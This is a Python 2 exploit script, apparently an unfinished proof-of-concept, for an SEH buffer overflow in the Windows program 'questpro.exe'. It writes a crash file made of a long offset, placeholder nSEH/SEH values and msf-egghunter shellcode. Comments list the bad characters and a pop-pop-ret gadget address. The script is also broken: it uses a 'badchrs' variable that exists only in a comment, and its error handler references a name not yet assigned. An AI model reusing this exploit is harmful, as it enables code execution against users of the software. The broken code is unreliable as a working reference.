#!/usr/bin/python
#1- Open 'questpro.exe'
#2- Go to Add   
#3- Paste payload from generated txt file

import os

blt = '\033[92m[\033[0m+\033[92m]\033[0m '           # green success bullet
err = '\033[91m[\033[0m!\033[91m]\033[0m '           # red   error   bullet

try:
    # SEH triggered by exception 'Access violation when reading [41414141]'
    # EIP: 00403AB8    8B10       mov edx, dword ptr ds:[eax]


    # Bad Charaters - These bytes truncate the buffer on stack:
    #    badchrs  = '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d'
    #boku@ekali# msf-egghunter -e BOKU -f python -b '\x00\x02\x03\x04\x05\x06\x07\x08\x0a\x0c\x0d' -p windows -v egghunter
    egghunter =  b""
    egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
    egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x42\x4f\x4b\x55"
    egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    offset     = "\x41" * 4116
    nSEH     = '\x42\x42\x42\x42'
#    nSEH     = '\xcc\x42\x42\x42'
    # 0x00400000 [questpro.exe] Rebase: False | ASLR: False | SafeSEH: False 
    # 0x0042666b [questpro.exe] : pop ecx # pop ebp # ret  | {PAGE_EXECUTE_READ} 
    SEH      = '\x44\x44\x44\x44'
#    SEH      = '\x6b\x66\x42'
    payload  = offset+nSEH+SEH+badchrs
    File     = 'crash.txt'
    f        = open(File, 'w')                       # open file for write
    f.write(payload)
    f.close()                                        # close the file
    print blt + File + " created successfully "
except:
    print err + File + ' failed to create'
    os.remove(File)                                  # remove the failed file

